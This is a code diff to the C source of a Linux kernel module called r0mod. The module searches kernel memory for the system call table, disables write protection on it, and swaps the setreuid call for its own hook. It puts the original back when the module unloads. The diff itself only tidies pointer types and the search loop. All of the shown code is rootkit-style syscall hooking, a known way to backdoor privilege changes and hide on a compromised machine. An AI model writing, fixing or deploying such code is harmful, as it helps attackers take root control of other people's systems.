@@ -6,7 +6,7 @@
 
 #include <r0mod/global.h>
 
-unsigned long **sct;
+unsigned long *sct;
 
 asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
@@ -24,21 +24,18 @@ asmlinkage int new_setreuid(uid_t ruid, uid_t euid)
     return orig_setreuid(ruid, euid);
 }
 
-unsigned long **locate_sct(void)
+unsigned long *locate_sct(void)
 {
-    unsigned long int offset = PAGE_OFFSET;
-    unsigned long **sct;
+    unsigned long offset;
 
-    while(offset < ULLONG_MAX)
+    for(offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *))
     {
-        sct = (unsigned long **)offset;
-        if(sct[__NR_close] == (unsigned long *)sys_close)
+        unsigned long *sct = (unsigned long *)offset;
+        if(sct[__NR_close] == (unsigned long)sys_close)
         {
             fm_alert("Succeeded to get sys_call_table!\n");
             return sct;
         }
-
-        offset += sizeof(void *);
     }
 
     fm_alert("Failed to get sys_call_table!\n");
@@ -81,7 +78,7 @@ static int __init r0mod_init(void)
     {
         fm_alert("sys_call_table: Hooking setreuid!\n");
         orig_setreuid = (void *)sct[__NR_setreuid];
-        sct[__NR_setreuid] = (unsigned long*)new_setreuid;
+        sct[__NR_setreuid] = (unsigned long)new_setreuid;
     }
     enable_page_protection();
 
@@ -97,7 +94,7 @@ static void __exit r0mod_exit(void)
         disable_page_protection();
         {
             fm_alert("sys_call_table: Restoring setreuid!\n");
-            sct[__NR_setreuid] = (unsigned long*)orig_setreuid;
+            sct[__NR_setreuid] = (unsigned long)orig_setreuid;
         }
         enable_page_protection();
     }
